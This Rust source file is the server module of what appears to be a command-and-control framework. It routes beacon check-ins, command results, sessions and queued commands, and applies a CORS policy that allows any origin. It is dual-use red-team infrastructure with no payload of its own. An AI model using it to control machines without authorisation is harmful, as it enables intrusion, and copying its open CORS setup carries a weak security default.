//! Server Module
//! Main server implementation

use crate::command::CommandQueue;
use crate::{handlers, session::SessionManager};
use anyhow::Result;
use axum::{
    routing::{get, post},
    Router,
};
use std::{net::SocketAddr, sync::Arc};
use tower_http::cors::{Any, CorsLayer};

#[derive(Clone)]
pub struct ServerState {
    pub sessions: SessionManager,
    pub commands: CommandQueue,
    pub crypto: crate::crypto::ServerCrypto,
}

pub struct Server {
    state: Arc<ServerState>,
}

impl Server {
    pub fn new(sessions: SessionManager, commands: CommandQueue, secret: String) -> Self {
        /* -> This will also take the sessions and commandq */
        let crypto = crate::crypto::ServerCrypto::new(&secret);
        Self {
            state: Arc::new(ServerState {
                sessions,
                commands,
                crypto,
            }),
        }
    }

    pub async fn run(self, addr: SocketAddr) -> Result<()> {
        let app = self.router();
        log::info!("Server listening on http://{}", addr);
        let listener = tokio::net::TcpListener::bind(&addr).await?;
        axum::serve(listener, app.into_make_service()).await?;
        Ok(())
    }

    /// This function will build the router
    fn router(&self) -> Router {
        let mut router = Router::new()
            // Mostly these will be the main beacon endpoints
            .route("/api/beacon", post(handlers::beacon::beacon))
            .route("/api/result", post(handlers::beacon::result))
            // Session managment endpints
            .route(
                "/api/sessions",
                get(handlers::session::list_sessions).post(handlers::session::list_sessions),
            )
            .route(
                "/api/sessions/:id",
                get(handlers::session::get_session)
                    .post(handlers::session::get_session)
                    .delete(handlers::session::remove_session),
            )
            .route(
                "/api/sessions/:id/commands",
                get(handlers::command::list_session_commands).post(handlers::session::send_command),
            )
            .route("/api/commands", get(handlers::command::list_commands))
            .route("/api/commands/:id", get(handlers::command::get_command));

        #[cfg(debug_assertions)]
        {
            router = router.route(
                "/api/test/sessions",
                post(handlers::session::register_test_session),
            );
        }

        router
            .layer(
                CorsLayer::new()
                    .allow_origin(Any)
                    .allow_methods(Any)
                    .allow_headers(Any),
            )
            .with_state(self.state.clone())
    }
}
